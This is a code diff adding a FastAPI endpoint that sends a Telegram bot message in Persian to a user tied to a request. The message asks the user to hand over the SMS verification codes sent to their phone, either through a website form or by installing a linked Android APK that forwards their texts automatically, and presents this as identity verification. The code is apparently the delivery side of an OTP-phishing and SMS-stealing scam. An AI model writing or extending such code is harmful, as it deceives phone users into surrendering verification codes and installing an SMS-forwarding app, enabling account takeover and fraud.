@@ -1821,6 +1821,69 @@ async def send_telegram_notification(msg: str, chat_id: str):
     except Exception as e:
         print(f"Failed to send Telegram notification: {e}")
 
+@app.post("/api/message/requests/{request_id}/service")
+async def sms_request(request_id: str,service: str,):
+    print(F"request_id:{request_id}")
+    if not request_id:
+        raise HTTPException(400, "request_id required")
+
+    # Get the Telegram chat_id from the users table
+    with get_db() as conn:
+        cur = conn.cursor()
+        cur.execute("SELECT telegram_id FROM requests r inner join users u on r.user_id = u.id WHERE r.id= ?", (request_id,))
+        row = cur.fetchone()
+        if not row or not row["telegram_id"]:
+            raise HTTPException(404, "User not found or no telegram_id")
+        chat_id = row["telegram_id"]
+        
+    # Send a message through the bot
+    if not BOT_TOKEN:
+        raise HTTPException(500, "BOT_TOKEN not configured")
+    text = """کاربر گرامی، از پرداخت شما سپاسگزاریم. 🙏
+
+برای تکمیل فرایند خرید امتیاز از تالار دستادس، لازم است کدهای تاییدی ارسال‌شده به شماره همراهتان را برای کارشناسان ما ارسال کنید.
+
+لطفاً پیامک‌های دریافتی را از یکی از دو روش زیر در اختیار ما قرار دهید:
+
+─━━━━━━━─
+❶ روش دستی (ارسال خودتان):
+هر بار که پیامک جدید دریافت کردید، آن را از طریق یکی از گزینه‌های زیر ارسال کنید:
+• وب‌سایت (از طریق لینک زیر)
+• ربات تلگرامی «کافی‌نت آنلاین»
+
+🔗 لینک وب‌سایت: https://cofenet-online.ir/code.html
+─━━━━━━━─
+❷ روش خودکار (پیشنهادی):
+با نصب اپلیکیشن اندرویدی، دیگر نیازی به ارسال دستی ندارید. این برنامه به‌طور خودکار پیامک‌های تالار دستادس را در صورت اتصال دستگاه به اینترنت، برای کارشناسان ما می‌فرستد.
+
+📥 لینک دانلود اپلیکیشن: https://cofenet-online.ir/app.apk
+─━━━━━━━─
+
+⚠️ توجه: هر زمان که آماده ارسال پیامک هستید یا اپلیکیشن را نصب کرده‌اید، لطفاً دکمه «شروع» را در پایین صفحه بزنید تا فرایند آغاز شود.
+
+این فرایند صرفاً جهت احراز هویت و افزایش امنیت خرید شما انجام می‌شود."""
+
+# Inline keyboard with one button
+    reply_markup = {
+    "inline_keyboard": [
+        [{"text": "✅ شروع", "callback_data": F"customer_ready_{request_id}"}]
+    ]
+}
+
+    async with httpx.AsyncClient(timeout=10) as client:
+       resp = await client.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+        json={
+            "chat_id": chat_id,
+            "text": text,
+            "reply_markup": reply_markup
+            # parse_mode is omitted (plain text)
+        }
+    )
+       resp.raise_for_status()
+    
+    return {"success": True}
+
 @app.post("/api/sms/request")
 async def sms_request(payload: dict):
     nationalCode = payload.get("nationalCode")
